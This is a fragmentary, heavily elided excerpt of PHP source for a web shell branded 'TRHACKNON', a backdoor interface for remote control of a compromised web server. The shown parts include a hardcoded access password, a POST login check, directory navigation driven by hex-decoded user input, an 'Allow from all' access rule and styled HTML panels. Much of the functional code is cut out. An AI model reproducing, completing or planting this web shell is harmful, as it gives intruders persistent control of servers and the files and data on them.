...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "trkntrkn"; //Change Password
	if (isset($_POST['pass'])) {
	...
	<html>
	<head>
	<title>-=[ TRHACKNON WEBSHELL ]=-</title>
	<link rel='icon' href='trkn.png'>
	...
	<html>
	<head>
		<title>Shell By TRHACKNON</title>
		<meta charset='UTF-8'>
...
<style>
		...
		* {
		...
		gr {
				color: #FF0000; /* Vert fluo */
				text-shadow: 0 0 5px #00FF7F, 0 0 10px #00FF7F;
		}
		h4 {
				color: #00FF7F; /* Vert fluo */
				text-shadow: 0 0 5px #00FF7F, 0 0 10px #00FF7F;
		}
		rd {
		...
		corner {
				...
				border: 2px solid #1E90FF; /* Bordure bleue fluo */
				border-radius: 10px;
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Shell PHP by – TRHACKNON</h4></a>    <center><div class='svg-container'>
        <img src='trutmp.svg' alt='SVG Animé'>
    </div></center><br>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
...
Allow from all
		...
		</div><div class='text-secondary'>&copy TRHACKNON WebShell</div>
	</div>
</div>
</body>
</html>
